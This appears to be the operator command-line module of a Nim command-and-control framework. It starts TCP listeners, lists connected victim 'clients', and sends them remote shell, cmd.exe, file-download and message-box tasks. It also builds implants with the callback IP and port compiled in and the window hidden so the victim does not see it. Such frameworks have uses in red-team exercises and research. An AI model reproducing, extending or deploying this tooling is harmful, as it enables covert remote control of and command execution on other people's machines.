import asyncdispatch, asyncnet, threadpool, asyncfutures
import strutils, terminal, osproc

import listeners/[tcp]
import communication
import ../utils

importCommands() # import ../commands/[shell, msgbox, download]
import types, logging

proc procStdin*(server: C2Server) {.async.} =

  let c2cli = server.cli

  c2cli.initialized = true

  prompt(server)

  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():

      let input = ^messageFlowVar
      let args = input.split(" ")
      let argsn = len(args)
      let cmd = args[0]
      let a_args = args[1..(argsn - 1)].join(" ")

      if c2cli.shellMode:
        if cmd == "back":
          c2cli.shellMode = false
        else:
          let task = await shell.sendTask(c2cli.handlingClient, input)
          await task.awaitResponse()
      else:
        case cmd:
            of "help":
                echo "-- Navigation"
                echo "  exit\twhy would you ever exit?"
                echo "  back\tgo back to main menu"
                echo "  interact [id]\tinteract with a client"
                echo "-- Listeners"
                echo "  startlistener [type] [..args]\tstart a listener"
                echo "  listeners\tshow a list of listeners"
                echo "  clientlisteners\tshow a list of listeners and their clients"
                echo "-- Implants"
                echo "  generateimplant [listener id] [platform]\tgenerate an implant (listener id e.g. tcp:0, tcp:1)"
                echo "-- Managing clients"
                echo "  clients\tview a list of clients"
                echo "  info\tget info about a client"
                echo "  shell [cmd]\trun a shell command"
                echo "  cmd [cmd]\trun a cmd command ('cmd.exe /c')"
                echo "  tmsgbox\tsend a message box"
                echo "-- More info"
                echo "  Checkout the wiki: "
            # implants

            of "generateimplant":
                var platform: string
                var ip: string
                var port: string
                var failed = false
                if argsn >= 3:
                    let args_split = args[1].split(":")
                    if argsn == 3:
                        let listenerType = args_split[0]
                        platform = args[2]
                        if listenerType == "tcp":
                            let listenerId = parseInt(args_split[1])
                            if len(server.tcpListeners) > listenerId:
                                let tcpListener = server.tcpListeners[listenerId]
                                infoLog "generating implant for " & $tcpListener
                                ip = tcpListener.listeningIP
                                if ip == "0.0.0.0":
                                    errorLog "can't automatically generate an implant for this listener because the listening ip is set to 0.0.0.0, you need to use the other command usage format"
                                    errorLog "generateimplant tcp (ip) (port) (platform)"
                                    failed = true
                                port = $tcpListener.port
                            else:
                                errorLog "couldn't find tcp listener"
                    elif argsn == 5:
                        platform = args[4]
                        ip = args[2]
                        port = args[3]
                    if not failed:
                        let compileCommand = "nim c -d:client " &
                                "--app=gui " & # disable window lol 
                                "-d:ip=" & ip & " " & 
                                "-d:port=" & port & " " & 
                                (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
                                "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
                                "./src/client/client.nim"
                        echo "Running " & compileCommand
                        let exitCode = execCmd(compileCommand)
                        if exitCode != 0:
                            errorLog "failed to build implant, check https://github.com/d4rckh/nimc2/wiki/FAQs"
                        else:
                            infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 
                else:
                    errorLog "incorrect usage, check https://github.com/d4rckh/nimc2/wiki/Usage#generating-an-implant"
            # listener management

            of "listeners":
                for tcpListener in server.tcpListeners:
                    infoLog @tcpListener
                infoLog $len(server.tcpListeners) & " listeners"
            of "clientlisteners":
                for tcpListener in server.tcpListeners:
                    infoLog @tcpListener
                    for client in server.clients:
                        if client.listenerType == "tcp" and client.listenerId == tcpListener.id and client.connected:
                            infoLog "\t<- " & $client
                infoLog $len(server.tcpListeners) & " listeners"
            of "startlistener":
                if argsn >= 2:
                    if args[1].toLower() == "tcp":
                        if argsn >= 4:
                            asyncCheck server.createNewTcpListener(parseInt(args[3]), args[2])
                        else:
                            echo "Bad usage, correct usage: startlistener TCP (ip) (port)"
                else:
                    echo "You need to specify the type of listener you wanna start, supported: TCP"
            
            # clients management

            of "clients":
                for client in server.clients:
                  if client.connected:
                    stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
                  else:
                    stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
                infoLog $len(server.clients) & " clients currently connected"
            of "info":
              if c2cli.handlingClient.isNil():
                errorLog "you need to interact with a client to use this command"
                continue
              echo @(c2cli.handlingClient)

            # tasks management

            of "tasks":
              for task in server.tasks:
                echo $task.client & " <= " & $task

            # navigation
            
            of "interact":
              for client in server.clients:
                if client.id == parseInt(args[1]):
                  c2cli.handlingClient = client
              if c2cli.handlingClient.isNil() or c2cli.handlingClient.id != parseInt(args[1]):
                infoLog "client not found"
            of "back": 
              c2cli.handlingClient = nil
            of "exit":
              for tcpListener in server.tcpListeners:
                tcpListener.running = false
                tcpListener.socket.close()
              quit(0)

            # client commands

            of "download":
              if c2cli.handlingClient.isNil():
                errorLog "you need to interact with a client to use this command"
                continue
              let task = await download.sendTask(c2cli.handlingClient, args[1])
              await task.awaitResponse()
            of "shell":
              if c2cli.handlingClient.isNil():
                errorLog "you need to interact with a client to use this command"
                continue
              if argsn == 1:
                infoLog "type 'back' to exit shell mode"
                c2cli.shellMode = true
                continue
              let task = await shell.sendTask(c2cli.handlingClient, a_args)
              await task.awaitResponse()
            of "cmd":
              if c2cli.handlingClient.isNil():
                errorLog "you need to interact with a client to use this command"
                continue
              let task = await shell.sendTask(c2cli.handlingClient, "cmd.exe /c " & a_args)
              await task.awaitResponse()
            of "msgbox":
              if c2cli.handlingClient.isNil():
                errorLog "you need to interact with a client to use this command"
                continue
              if argsn >= 3:
                let slashSplit = a_args.split("/")
                discard await msgbox.sendTask(c2cli.handlingClient, slashSplit[1].strip(), slashSplit[0].strip())
              else:
                echo "wrong usage. msgbox (title) / (caption)"

      prompt(server)
      messageFlowVar = spawn stdin.readLine()
      
    await asyncdispatch.sleepAsync(100)
